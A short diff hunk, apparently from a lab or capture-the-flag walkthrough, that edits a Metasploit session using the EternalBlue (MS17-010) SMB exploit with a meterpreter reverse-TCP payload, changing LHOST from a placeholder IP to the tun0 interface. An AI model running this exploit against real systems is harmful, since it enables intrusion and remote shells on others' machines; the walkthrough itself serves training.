@@ -120,7 +120,7 @@ Exploit target:
 $ msfconsole -q
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST <OPENVPN_IP>
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
 LHOST => <OPENVPN_IP>
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <MACHINE_IP>
 RHOSTS => <MACHINE_IP>
